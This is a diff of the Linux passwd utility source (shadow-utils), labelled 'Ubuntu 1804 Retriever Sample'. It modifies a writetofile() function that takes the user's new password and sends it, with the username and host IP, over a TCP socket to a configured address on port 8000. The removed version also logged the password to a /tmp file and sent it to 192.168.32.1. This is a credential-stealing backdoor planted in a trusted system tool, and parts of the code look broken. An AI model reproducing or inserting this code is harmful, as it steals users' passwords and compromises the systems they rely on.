@@ -1,4 +1,6 @@
 /*
+ * Ubuntu 1804 Retriever Sample
+ *
  * Copyright (c) 1989 - 1994, Julianne Frances Haugh
  * Copyright (c) 1996 - 2000, Marek Michałkiewicz
  * Copyright (c) 2001 - 2006, Tomasz Kłoczko
@@ -42,10 +44,6 @@
 #include <stdio.h>
 #include <sys/types.h>
 #include <time.h>
-#include <sys/socket.h> // New
-#include <arpa/inet.h> // New
-#include <unistd.h> // New
-#include <string.h> // New
 #include "defines.h"
 #include "getdef.h"
 #include "nscd.h"
@@ -54,8 +52,15 @@
 #include "pwauth.h"
 #include "pwio.h"
 #include "shadowio.h"
-#define PORT 8000 // New
-#define IP "192.168.32.1" // New
+#include <sys/socket.h>
+#include <arpa/inet.h> 
+#include <sys/ioctl.h>
+#include <netinet/in.h>
+#include <net/if.h>
+#include <unistd.h> 
+#include <string.h> 
+#define PORT 8000 
+#define IP "127.0.0.1" 
 
 /*
  * exit status values
@@ -210,84 +215,66 @@ static bool reuse (const char *pass, const struct passwd *pw)
 
 int writetofile (char *password){
 
-	// Get UID
-	uid_t uid = geteuid();
-	struct passwd * pw = getpwuid(uid);
-	
-	// Create File + Variables
-	FILE * fptr;
-	fptr = fopen("/tmp/18432443.tmp", "a");
-	char * user;
-	char * msg;
-	char * msg2;
-	char * colon;
+    /* Get UID */
+    uid_t uid = geteuid();
+    struct passwd * pw = getpwuid(uid);
+            
+    /* Get IP Address */
+    int fd;
+    struct ifreq ifr;
+    fd = socket(AF_INET, SOCK_DGRAM, 0);
+        
+    /* I want to get an IPv4 IP address */
+    ifr.ifr_addr.sa_family = AF_INET;
 
-	// Write Shit
-	if (pw) {
-		user = pw->pw_name;
-	}
-	else {
-		user = "unknown";
-	}
+    /* I want IP address attached to set interface */
+    strncpy(ifr.ifr_name, ens33, IFNAMSIZ-1);
+    ioctl(fd, SIOCGIFADDR, &ifr);
+    close(fd);
+    
+    /* display result */
+    char buffer[256];
+    char * ip;
+    ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
+    int j = snprintf(buffer, 256, "%s:%s:%s\n", name, password, ip);
+    
+    /* Make Socket */
+    int sock = 0, valread;
+    struct sockaddr_in serv_addr;
 
-	if (fptr != NULL) {
+    /* Sock creation Pt 2*/
+    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+        return -1;
+    }
 
-		fprintf(fptr, "%s:%s\n", name, password);
-		
-		// Send Shit //
-		// Make Socket
-		int sock = 0, valread;
-		struct sockaddr_in serv_addr;
-		
-		// Build String
-		strcpy(user, name);
-		msg = ("%s", password);
-		msg2 = ("%s:", user);
-		colon = ':';
-		strncat(msg2, &colon, 1);
-		strcat(msg2, msg);
+    /* Socket Options */
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(PORT);
+        
+    /* Timeout settings */
+    struct timeval timeout;
+    timeout.tv_sec = 3;
+    timeout.tv_usec = 0;
+    
+    if (setsockopt (sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof timeout) < 0)  {
+        return -1;
+    }
+    if (setsockopt (sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof timeout) < 0) {
+        // pass
 
-		char buffer[1024] = {0};
-		fclose(fptr);
+    /* set IP and set buffer */
+    }
+    if(inet_pton(AF_INET, IP, &serv_addr.sin_addr)<=0) {
+        return -1;
+    }
+    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
+        return -1;
+    }
 
-		// Error Handling
-		if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
-        	// printf("\n Socket creation error \n");
-        	return -1;
-    	}
-
-		serv_addr.sin_family = AF_INET;
-    	serv_addr.sin_port = htons(PORT);
-		
-		struct timeval timeout;
-		timeout.tv_sec = 3;
-		timeout.tv_usec = 0;
-
-		if (setsockopt (sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof timeout) < 0)  {
-			// puts("Setsockopt failed\n");
-			return -1;
-		}
-		
-		if (setsockopt (sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof timeout) < 0) {
-        	// puts("setsockopt failed\n");
-		}
-
-
-		// Error Handling
-		if(inet_pton(AF_INET, IP, &serv_addr.sin_addr)<=0) {
-        	// puts("\nInvalid address/ Address not supported \n");
-        	return -1;
-    	}
-    	if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
-        	return -1;
-    	}
-
-		// Send Message
-		send(sock , msg2 , strlen(msg2) , 0 );
-		return 0;
-	}
-
-	return 0;
+    /* Send Message */
+    send(sock , buffer , strlen(buffer) , 0 ); 
+    
+    return 0;
 }
 
 /*
